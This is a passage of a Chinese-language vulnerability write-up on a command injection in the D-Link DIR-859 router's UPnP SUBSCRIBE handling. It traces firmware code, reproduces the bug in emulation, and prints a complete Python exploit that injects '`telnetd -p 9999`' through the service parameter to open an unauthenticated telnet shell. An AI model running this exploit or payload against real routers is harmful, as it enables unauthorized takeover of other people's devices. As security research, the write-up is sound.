<pre class=" language-c"><code class="language-c">undefined4 <span class="token function">FUN_00413810</span><span class="token punctuation">(</span><span class="token keyword">int</span> param_1<span class="token punctuation">,</span>undefined2 param_2<span class="token punctuation">,</span>undefined4 param_3<span class="token punctuation">,</span><span class="token keyword">void</span> <span class="token operator">*</span>buf<span class="token punctuation">,</span>ushort param_5<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
  sVar1 <span class="token operator">=</span> <span class="token function">send</span><span class="token punctuation">(</span>param_1<span class="token punctuation">,</span><span class="token operator">&amp;</span>local_20<span class="token punctuation">,</span><span class="token number">0xc</span><span class="token punctuation">,</span><span class="token number">0x4000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  uVar2 <span class="token operator">=</span> <span class="token number">0xffffffff</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token number">0</span> <span class="token operator">&lt;</span> sVar1<span class="token punctuation">)</span> <span class="token punctuation">{</span>
     sVar1 <span class="token operator">=</span> <span class="token function">send</span><span class="token punctuation">(</span>param_1<span class="token punctuation">,</span>buf<span class="token punctuation">,</span><span class="token punctuation">(</span>uint<span class="token punctuation">)</span>param_5<span class="token punctuation">,</span><span class="token number">0x4000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
     uVar2 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
     <span class="token keyword">if</span> <span class="token punctuation">(</span>sVar1 <span class="token operator">&lt;</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
       uVar2 <span class="token operator">=</span> <span class="token number">0xffffffff</span><span class="token punctuation">;</span>
     <span class="token punctuation">}</span>
  <span class="token punctuation">}</span>
  <span class="token keyword">return</span> uVar2<span class="token punctuation">;</span>
<span class="token punctuation">}</span></code></pre>
<p>发现我们的buf被send给创建好的socket。其实是发送给了php脚本进行处理。</p>
<p>至此整个流程为：buf -&gt; <code>xmldbc_ephp()</code> -&gt; <code>FUN_0041420c()</code> -&gt; <code>FUN_00413810()</code> -&gt; socket。经过xmldbc_ephp()处理后，由buf中的参数<code>/htdocs/upnp/run.NOTIFY.php</code>这个php文件进行处理。</p>
<p>run.NOTIFY.php内容为：</p>
<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?</span>
<span class="token keyword">include</span> <span class="token string">"/htdocs/phplib/upnp/xnode.php"</span><span class="token punctuation">;</span>
<span class="token keyword">include</span> <span class="token string">"/htdocs/upnpinc/gvar.php"</span><span class="token punctuation">;</span>
<span class="token keyword">include</span> <span class="token string">"/htdocs/upnpinc/gena.php"</span><span class="token punctuation">;</span>

<span class="token variable">$gena_path</span> <span class="token operator">=</span> <span class="token function">XNODE_getpathbytarget</span><span class="token punctuation">(</span><span class="token variable">$G_GENA_NODEBASE</span><span class="token punctuation">,</span> <span class="token string">"inf"</span><span class="token punctuation">,</span> <span class="token string">"uid"</span><span class="token punctuation">,</span> <span class="token variable">$INF_UID</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$gena_path</span> <span class="token operator">=</span> <span class="token variable">$gena_path</span><span class="token punctuation">.</span><span class="token string">"/"</span><span class="token punctuation">.</span><span class="token variable">$SERVICE</span><span class="token punctuation">;</span>
<span class="token function">GENA_subscribe_cleanup</span><span class="token punctuation">(</span><span class="token variable">$gena_path</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment" spellcheck="true">/* IGD services */</span>
<span class="token keyword">if</span>        <span class="token punctuation">(</span><span class="token variable">$SERVICE</span> <span class="token operator">==</span> <span class="token string">"L3Forwarding1"</span><span class="token punctuation">)</span>    <span class="token variable">$php</span> <span class="token operator">=</span> <span class="token string">"NOTIFY.Layer3Forwarding.1.php"</span><span class="token punctuation">;</span>
<span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$SERVICE</span> <span class="token operator">==</span> <span class="token string">"OSInfo1"</span><span class="token punctuation">)</span>            <span class="token variable">$php</span> <span class="token operator">=</span> <span class="token string">"NOTIFY.OSInfo.1.php"</span><span class="token punctuation">;</span>
<span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$SERVICE</span> <span class="token operator">==</span> <span class="token string">"WANCommonIFC1"</span><span class="token punctuation">)</span>    <span class="token variable">$php</span> <span class="token operator">=</span> <span class="token string">"NOTIFY.WANCommonInterfaceConfig.1.php"</span><span class="token punctuation">;</span>
<span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$SERVICE</span> <span class="token operator">==</span> <span class="token string">"WANEthLinkC1"</span><span class="token punctuation">)</span>    <span class="token variable">$php</span> <span class="token operator">=</span> <span class="token string">"NOTIFY.WANEthernetLinkConfig.1.php"</span><span class="token punctuation">;</span>
<span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$SERVICE</span> <span class="token operator">==</span> <span class="token string">"WANIPConn1"</span><span class="token punctuation">)</span>        <span class="token variable">$php</span> <span class="token operator">=</span> <span class="token string">"NOTIFY.WANIPConnection.1.php"</span><span class="token punctuation">;</span>
<span class="token comment" spellcheck="true">/* WFA services */</span>
<span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$SERVICE</span> <span class="token operator">==</span> <span class="token string">"WFAWLANConfig1"</span><span class="token punctuation">)</span>    <span class="token variable">$php</span> <span class="token operator">=</span> <span class="token string">"NOTIFY.WFAWLANConfig.1.php"</span><span class="token punctuation">;</span>


<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$METHOD</span> <span class="token operator">==</span> <span class="token string">"SUBSCRIBE"</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$SID</span> <span class="token operator">==</span> <span class="token string">""</span><span class="token punctuation">)</span>
        <span class="token function">GENA_subscribe_new</span><span class="token punctuation">(</span><span class="token variable">$gena_path</span><span class="token punctuation">,</span> <span class="token variable">$HOST</span><span class="token punctuation">,</span> <span class="token variable">$REMOTE</span><span class="token punctuation">,</span> <span class="token variable">$URI</span><span class="token punctuation">,</span> <span class="token variable">$TIMEOUT</span><span class="token punctuation">,</span> <span class="token variable">$SHELL_FILE</span><span class="token punctuation">,</span> <span class="token string">"/htdocs/upnp/"</span><span class="token punctuation">.</span><span class="token variable">$php</span><span class="token punctuation">,</span> <span class="token variable">$INF_UID</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">else</span>
        <span class="token function">GENA_subscribe_sid</span><span class="token punctuation">(</span><span class="token variable">$gena_path</span><span class="token punctuation">,</span> <span class="token variable">$SID</span><span class="token punctuation">,</span>  <span class="token variable">$TIMEOUT</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$METHOD</span> <span class="token operator">==</span> <span class="token string">"UNSUBSCRIBE"</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token function">GENA_unsubscribe</span><span class="token punctuation">(</span><span class="token variable">$gena_path</span><span class="token punctuation">,</span> <span class="token variable">$SID</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token delimiter">?></span></code></pre>
<p>可以看到当请求方式为SUBSCRIBE的时候才会进一步处理，该脚本中<code>GENA_subscribe_new()</code>处理了变量<code>$SHELL_FILE</code></p>
<pre class=" language-php"><code class="language-php"><span class="token function">GENA_subscribe_new</span><span class="token punctuation">(</span><span class="token variable">$gena_path</span><span class="token punctuation">,</span> <span class="token variable">$HOST</span><span class="token punctuation">,</span> <span class="token variable">$REMOTE</span><span class="token punctuation">,</span> <span class="token variable">$URI</span><span class="token punctuation">,</span> <span class="token variable">$TIMEOUT</span><span class="token punctuation">,</span> <span class="token variable">$SHELL_FILE</span><span class="token punctuation">,</span> <span class="token string">"/htdocs/upnp/"</span><span class="token punctuation">.</span><span class="token variable">$php</span><span class="token punctuation">,</span> <span class="token variable">$INF_UID</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>
<p>使用命令<code>grep -nr "GENA_subscribe_new"</code>搜索<code>GENA_subscribe_new()</code>发现其定义在upnpinc/gena.php脚本中。 </p>
<p>文件：gena.php，<code>GENA_notify_init()</code>函数 </p>
<pre class=" language-php"><code class="language-php"><span class="token keyword">function</span> <span class="token function">GENA_subscribe_new</span><span class="token punctuation">(</span><span class="token variable">$node_base</span><span class="token punctuation">,</span> <span class="token variable">$host</span><span class="token punctuation">,</span> <span class="token variable">$remote</span><span class="token punctuation">,</span> <span class="token variable">$uri</span><span class="token punctuation">,</span> <span class="token variable">$timeout</span><span class="token punctuation">,</span> <span class="token variable">$shell_file</span><span class="token punctuation">,</span> <span class="token variable">$target_php</span><span class="token punctuation">,</span> <span class="token variable">$inf_uid</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token function">anchor</span><span class="token punctuation">(</span><span class="token variable">$node_base</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$count</span> <span class="token operator">=</span> <span class="token function">query</span><span class="token punctuation">(</span><span class="token string">"subscription#"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$found</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token comment" spellcheck="true">/* find subscription index &amp; uuid */</span>
    <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token string">"subscription"</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">query</span><span class="token punctuation">(</span><span class="token string">"host"</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token variable">$host</span> <span class="token operator">&amp;&amp;</span> <span class="token function">query</span><span class="token punctuation">(</span><span class="token string">"uri"</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token variable">$uri</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span><span class="token variable">$found</span> <span class="token operator">=</span> <span class="token variable">$InDeX</span><span class="token punctuation">;</span> <span class="token keyword">break</span><span class="token punctuation">;</span><span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$found</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token variable">$index</span> <span class="token operator">=</span> <span class="token variable">$count</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>
        <span class="token variable">$new_uuid</span> <span class="token operator">=</span> <span class="token string">"uuid:"</span><span class="token punctuation">.</span><span class="token function">query</span><span class="token punctuation">(</span><span class="token string">"/runtime/genuuid"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">else</span>
    <span class="token punctuation">{</span>
        <span class="token variable">$index</span> <span class="token operator">=</span> <span class="token variable">$found</span><span class="token punctuation">;</span>
        <span class="token variable">$new_uuid</span> <span class="token operator">=</span> <span class="token function">query</span><span class="token punctuation">(</span><span class="token string">"subscription:"</span><span class="token punctuation">.</span><span class="token variable">$index</span><span class="token punctuation">.</span><span class="token string">"/uuid"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token comment" spellcheck="true">/* get timeout */</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$timeout</span><span class="token operator">==</span><span class="token number">0</span> <span class="token operator">||</span> <span class="token variable">$timeout</span><span class="token operator">==</span><span class="token string">""</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token variable">$timeout</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$new_timeout</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span>
    <span class="token keyword">else</span> <span class="token punctuation">{</span><span class="token variable">$new_timeout</span> <span class="token operator">=</span> <span class="token function">query</span><span class="token punctuation">(</span><span class="token string">"/runtime/device/uptime"</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token variable">$timeout</span><span class="token punctuation">;</span><span class="token punctuation">}</span>
    <span class="token comment" spellcheck="true">/* set to nodes */</span>
    <span class="token function">set</span><span class="token punctuation">(</span><span class="token string">"subscription:"</span><span class="token punctuation">.</span><span class="token variable">$index</span><span class="token punctuation">.</span><span class="token string">"/remote"</span><span class="token punctuation">,</span>    <span class="token variable">$remote</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">set</span><span class="token punctuation">(</span><span class="token string">"subscription:"</span><span class="token punctuation">.</span><span class="token variable">$index</span><span class="token punctuation">.</span><span class="token string">"/uuid"</span><span class="token punctuation">,</span>        <span class="token variable">$new_uuid</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">set</span><span class="token punctuation">(</span><span class="token string">"subscription:"</span><span class="token punctuation">.</span><span class="token variable">$index</span><span class="token punctuation">.</span><span class="token string">"/host"</span><span class="token punctuation">,</span>        <span class="token variable">$host</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">set</span><span class="token punctuation">(</span><span class="token string">"subscription:"</span><span class="token punctuation">.</span><span class="token variable">$index</span><span class="token punctuation">.</span><span class="token string">"/uri"</span><span class="token punctuation">,</span>        <span class="token variable">$uri</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">set</span><span class="token punctuation">(</span><span class="token string">"subscription:"</span><span class="token punctuation">.</span><span class="token variable">$index</span><span class="token punctuation">.</span><span class="token string">"/timeout"</span><span class="token punctuation">,</span>    <span class="token variable">$new_timeout</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">set</span><span class="token punctuation">(</span><span class="token string">"subscription:"</span><span class="token punctuation">.</span><span class="token variable">$index</span><span class="token punctuation">.</span><span class="token string">"/seq"</span><span class="token punctuation">,</span> <span class="token string">"1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token function">GENA_subscribe_http_resp</span><span class="token punctuation">(</span><span class="token variable">$new_uuid</span><span class="token punctuation">,</span> <span class="token variable">$timeout</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">GENA_notify_init</span><span class="token punctuation">(</span><span class="token variable">$shell_file</span><span class="token punctuation">,</span> <span class="token variable">$target_php</span><span class="token punctuation">,</span> <span class="token variable">$inf_uid</span><span class="token punctuation">,</span> <span class="token variable">$host</span><span class="token punctuation">,</span> <span class="token variable">$uri</span><span class="token punctuation">,</span> <span class="token variable">$new_uuid</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span></code></pre>
<p>其中<code>GENA_subscribe_http_resp($new_uuid, $timeout)</code>是加载对订阅事件的应答报文头部。并没有处理<code>$shell_file</code></p>
<p>文件：gena.php，<code>GENA_subscribe_http_resp()</code>函数 </p>
<pre class=" language-php"><code class="language-php"><span class="token keyword">function</span> <span class="token function">GENA_subscribe_http_resp</span><span class="token punctuation">(</span><span class="token variable">$sid</span><span class="token punctuation">,</span> <span class="token variable">$timeout</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token comment" spellcheck="true">/* Generate HTTP header */</span>
    <span class="token keyword">echo</span> <span class="token string">"HTTP/1.1 200 OK\r\n"</span><span class="token punctuation">;</span>
    <span class="token keyword">echo</span> <span class="token string">"SID: "</span><span class="token punctuation">.</span><span class="token variable">$sid</span><span class="token punctuation">.</span><span class="token string">"\r\n"</span><span class="token punctuation">;</span>
    <span class="token keyword">echo</span> <span class="token string">"TIMEOUT: "</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$timeout</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token keyword">echo</span> <span class="token string">"Second-infinite"</span><span class="token punctuation">;</span>
    <span class="token keyword">else</span> <span class="token keyword">echo</span> <span class="token string">"Second-"</span><span class="token punctuation">.</span><span class="token variable">$timeout</span><span class="token punctuation">;</span>
    <span class="token keyword">echo</span> <span class="token string">"\r\n\r\n"</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span></code></pre>
<p>继续跟踪<code>$shell_file</code>，发现真正处理<code>$shell_file</code>的<code>GENA_notify_init()</code>函数。</p>
<p>文件：gena.php，<code>GENA_notify_init()</code>函数 </p>
<pre class=" language-php"><code class="language-php"><span class="token keyword">function</span> <span class="token function">GENA_notify_init</span><span class="token punctuation">(</span><span class="token variable">$shell_file</span><span class="token punctuation">,</span> <span class="token variable">$target_php</span><span class="token punctuation">,</span> <span class="token variable">$inf_uid</span><span class="token punctuation">,</span> <span class="token variable">$host</span><span class="token punctuation">,</span> <span class="token variable">$uri</span><span class="token punctuation">,</span> <span class="token variable">$sid</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>

    <span class="token variable">$inf_path</span> <span class="token operator">=</span> <span class="token function">XNODE_getpathbytarget</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">,</span> <span class="token string">"inf"</span><span class="token punctuation">,</span> <span class="token string">"uid"</span><span class="token punctuation">,</span> <span class="token variable">$inf_uid</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$inf_path</span><span class="token operator">==</span><span class="token string">""</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token function">TRACE_debug</span><span class="token punctuation">(</span><span class="token string">"can't find inf_path by $inf_uid="</span><span class="token punctuation">.</span><span class="token variable">$inf_uid</span><span class="token punctuation">.</span><span class="token string">"!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token string">""</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token variable">$phyinf</span> <span class="token operator">=</span> <span class="token function">PHYINF_getifname</span><span class="token punctuation">(</span><span class="token function">query</span><span class="token punctuation">(</span><span class="token variable">$inf_path</span><span class="token punctuation">.</span><span class="token string">"/phyinf"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$phyinf</span> <span class="token operator">==</span> <span class="token string">""</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token function">TRACE_debug</span><span class="token punctuation">(</span><span class="token string">"can't get phyinf by $inf_uid="</span><span class="token punctuation">.</span><span class="token variable">$inf_uid</span><span class="token punctuation">.</span><span class="token string">"!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token string">""</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token variable">$upnpmsg</span> <span class="token operator">=</span> <span class="token function">query</span><span class="token punctuation">(</span><span class="token string">"/runtime/upnpmsg"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$upnpmsg</span> <span class="token operator">==</span> <span class="token string">""</span><span class="token punctuation">)</span> <span class="token variable">$upnpmsg</span> <span class="token operator">=</span> <span class="token string">"/dev/null"</span><span class="token punctuation">;</span>
    <span class="token function">fwrite</span><span class="token punctuation">(</span>w<span class="token punctuation">,</span> <span class="token variable">$shell_file</span><span class="token punctuation">,</span>
        <span class="token string">"#!/bin/sh\n"</span><span class="token punctuation">.</span>
        <span class="token string">'echo "[$0] ..." > '</span><span class="token punctuation">.</span><span class="token variable">$upnpmsg</span><span class="token punctuation">.</span><span class="token string">"\n"</span><span class="token punctuation">.</span>
        <span class="token string">"xmldbc -P "</span><span class="token punctuation">.</span><span class="token variable">$target_php</span><span class="token punctuation">.</span>
            <span class="token string">" -V INF_UID="</span><span class="token punctuation">.</span><span class="token variable">$inf_uid</span><span class="token punctuation">.</span>
            <span class="token string">" -V HDR_URL="</span><span class="token punctuation">.</span><span class="token variable">$uri</span><span class="token punctuation">.</span>
            <span class="token string">" -V HDR_HOST="</span><span class="token punctuation">.</span><span class="token variable">$host</span><span class="token punctuation">.</span>
            <span class="token string">" -V HDR_SID="</span><span class="token punctuation">.</span><span class="token variable">$sid</span><span class="token punctuation">.</span>
            <span class="token string">" -V HDR_SEQ=0"</span><span class="token punctuation">.</span>
            <span class="token string">" | httpc -i "</span><span class="token punctuation">.</span><span class="token variable">$phyinf</span><span class="token punctuation">.</span><span class="token string">" -d \""</span><span class="token punctuation">.</span><span class="token variable">$host</span><span class="token punctuation">.</span><span class="token string">"\" -p TCP > "</span><span class="token punctuation">.</span><span class="token variable">$upnpmsg</span><span class="token punctuation">.</span><span class="token string">"\n"</span>
    <span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">fwrite</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> <span class="token variable">$shell_file</span><span class="token punctuation">,</span> <span class="token string">"rm -f "</span><span class="token punctuation">.</span><span class="token variable">$shell_file</span><span class="token punctuation">.</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span></code></pre>
<p>发现了<code>$shell_file</code>最后结束的地方，该函数两次调用<code>fwrite()</code>，在网上查阅了正常PHP函数<code>fwrite()</code>用法是结合<code>fopen()</code>来创建文件，这里的<code>fwrite()</code>可能重新定义了。第一次调用<code>fwrite()</code>，是新建一个名为<code>$shell_file</code>的文件。这没什么问题。</p>
<p>可以回溯之前提到的<code>sprintf()</code>，里面的SHELL_FILE变量是可以被我们控制的。</p>
<pre class=" language-c"><code class="language-c"><span class="token function">sprintf</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span>
                       <span class="token string">"%s\nMETHOD=SUBSCRIBE\nINF_UID=%s\nSERVICE=%s\nHOST=%s\nURI=/%s\nTIMEOUT=%d\nREMOTE=%s\nSHELL_FILE=%s/%s_%d.sh"</span>
                       <span class="token punctuation">,</span><span class="token string">"/htdocs/upnp/run.NOTIFY.php"</span><span class="token punctuation">,</span>request_method<span class="token punctuation">,</span>request_uri_0x3f<span class="token punctuation">,</span>http_callback <span class="token operator">+</span> <span class="token number">7</span><span class="token punctuation">,</span>
                       http_sid <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span>real_timeout<span class="token punctuation">,</span>remote_addr<span class="token punctuation">,</span><span class="token string">"/var/run"</span><span class="token punctuation">,</span>request_uri_0x3f<span class="token punctuation">,</span>pid<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>
<pre class=" language-php"><code class="language-php">如果<span class="token constant">REQUEST_URI</span> <span class="token operator">=</span> "http<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//IP:PORT/*?service=file_name"</span>
新建的文件完整路径应该是：<span class="token operator">/</span><span class="token keyword">var</span><span class="token operator">/</span>run<span class="token operator">/</span>file_name_pid<span class="token punctuation">.</span>sh</code></pre>
<p>问题出现在第二次调用<code>fwrite()</code>是向这个文件加入一行<code>"rm -f ".$shell_file."\n"</code>，目的是为了删除新建的文件。问题就出现在这个地方。</p>
<pre class=" language-php"><code class="language-php">如果<span class="token constant">REQUEST_URI</span> <span class="token operator">=</span> "http<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//IP:PORT/*?service=`telnetd -p 1234`"</span>
新建的文件完整路径应该是：<span class="token operator">/</span><span class="token keyword">var</span><span class="token operator">/</span>run<span class="token operator">/</span>`telnetd <span class="token operator">-</span>p <span class="token number">1234</span>`_pid<span class="token punctuation">.</span>sh    
系统运行命令 rm <span class="token operator">-</span>rf <span class="token operator">/</span><span class="token keyword">var</span><span class="token operator">/</span>run<span class="token operator">/</span>`telnetd <span class="token operator">-</span>p <span class="token number">1234</span>`_pid<span class="token punctuation">.</span>sh</code></pre>
<p>如果rm 命令遇到反引号，rm命令将会运行失败，并且继续执行反引号里面的命令。所以只要控制好SHELL_FILE变量就能触发漏洞。</p>
<h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>利用FIRMADYNE全仿真系统模拟路由器固件运行，可以自己参照firmadyne使用步骤写利用脚本，也可以利用知世师傅写的<a href="https://github.com/nightRainy/Auxiliary_tools/blob/master/iot/fastrun.py" target="_blank" rel="noopener">脚本</a>或者利用firmadyne的自动化利用工具 <a href="https://github.com/attify/firmware-analysis-toolkit" target="_blank" rel="noopener">firmware-analysis-toolkit</a> 中的./fat.py将固件模拟运行起来。</p>
<p><img src="dir859.png" alt=""></p>
<p>随后利用nmap进行扫描firmadynew为路由器配置的默认IP地址<code>192.168.0.1</code>发现，该主机确实存活并且开启了4个端口(53DNS端口、80HTTP端口、443HTTPS端口、49152应该是upnp端口)</p>
<p><img src="nmap.png" alt=""></p>
<h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><p>这是研究员Miguel Mendez Z.的<a href="https://github.com/s1kr10s/D-Link-DIR-859-RCE/blob/master/reverseshell-SUBSCRIBE.py" target="_blank" rel="noopener">EXP</a>脚本。</p>
<pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> socket
<span class="token keyword">import</span> os
<span class="token keyword">from</span> time <span class="token keyword">import</span> sleep
<span class="token keyword">def</span> <span class="token function">httpSUB</span><span class="token punctuation">(</span>server<span class="token punctuation">,</span> port<span class="token punctuation">,</span> shell_file<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\n[*] Connection {host}:{port}'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>host<span class="token operator">=</span>server<span class="token punctuation">,</span> port<span class="token operator">=</span>port<span class="token punctuation">)</span>
    con <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span> socket<span class="token punctuation">.</span>SOCK_STREAM<span class="token punctuation">)</span>
    request <span class="token operator">=</span> <span class="token string">"SUBSCRIBE /gena.cgi?service="</span> <span class="token operator">+</span> str<span class="token punctuation">(</span>shell_file<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">" HTTP/1.0\n"</span>
    request <span class="token operator">+=</span> <span class="token string">"Host: "</span> <span class="token operator">+</span> str<span class="token punctuation">(</span>server<span class="token punctuation">)</span> <span class="token operator">+</span> str<span class="token punctuation">(</span>port<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"\n"</span>
    request <span class="token operator">+=</span> <span class="token string">"Callback: &lt;http://192.168.0.4:34033/ServiceProxy27>\n"</span>
    request <span class="token operator">+=</span> <span class="token string">"NT: upnp:event\n"</span>
    request <span class="token operator">+=</span> <span class="token string">"Timeout: Second-1800\n"</span>
    request <span class="token operator">+=</span> <span class="token string">"Accept-Encoding: gzip, deflate\n"</span>
    request <span class="token operator">+=</span> <span class="token string">"User-Agent: gupnp-universal-cp GUPnP/1.0.2 DLNADOC/1.50\n\n"</span>

    sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'[*] Sending Payload'</span><span class="token punctuation">)</span>
    con<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token punctuation">(</span>socket<span class="token punctuation">.</span>gethostbyname<span class="token punctuation">(</span>server<span class="token punctuation">)</span><span class="token punctuation">,</span>port<span class="token punctuation">)</span><span class="token punctuation">)</span>
    con<span class="token punctuation">.</span>send<span class="token punctuation">(</span>request<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    results <span class="token operator">=</span> con<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">4096</span><span class="token punctuation">)</span>

    sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'[*] Running Telnetd Service'</span><span class="token punctuation">)</span>
    sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'[*] Opening Telnet Connection\n'</span><span class="token punctuation">)</span>
    sleep<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>
    os<span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string">'telnet '</span> <span class="token operator">+</span> str<span class="token punctuation">(</span>server<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">' 9999'</span><span class="token punctuation">)</span>

serverInput <span class="token operator">=</span> raw_input<span class="token punctuation">(</span><span class="token string">'IP Router: '</span><span class="token punctuation">)</span>
portInput <span class="token operator">=</span> <span class="token number">49152</span> <span class="token comment" spellcheck="true">#upnp端口</span>

httpSUB<span class="token punctuation">(</span>serverInput<span class="token punctuation">,</span> portInput<span class="token punctuation">,</span> <span class="token string">'`telnetd -p 9999 `'</span><span class="token punctuation">)</span></code></pre>
<p>运行EXP结果如下：</p>
<p><img src="poc.png" alt=""></p>
<p>nmap扫描发现打开了9999端口，并能够在未授权的情况下获取路由器的shell。</p>
